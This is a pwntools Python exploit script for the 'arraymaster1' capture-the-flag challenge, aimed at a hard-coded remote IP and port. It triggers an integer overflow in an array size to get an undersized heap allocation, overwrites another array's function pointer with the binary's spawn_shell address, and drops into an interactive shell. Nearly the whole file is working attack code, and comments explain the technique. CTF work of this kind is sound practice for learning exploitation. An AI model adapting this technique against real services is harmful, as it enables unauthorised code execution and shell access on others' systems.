#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('arraymaster1')

host = args.HOST or '35.207.132.47'
port = int(args.PORT or 22228)

env = {'LD_PRELOAD':'./libc-2.27.so'}
env = {}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
#break *0x400B1C
#break *0x400B3E
#break *0x400B29
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# this will create array {type: 64, length: 2305843009213693953}
# but it will alloc only 8 bytes for the numbers (1 element)
io.sendlineafter('>', 'init A 64 {}'.format(2305843009213693953))
io.sendlineafter('>', 'init B 64 1')

# B is the victim. We will overwrite the array_t->get() function pointer
# It will be the 7th element (A array 1 byte + 2 bytes for the chunk header + 4 bytes in the array_t struct)
io.sendlineafter('>', 'set A 7 {}'.format(exe.symbols['spawn_shell']))
io.sendlineafter('>', 'get B 0')

io.interactive()

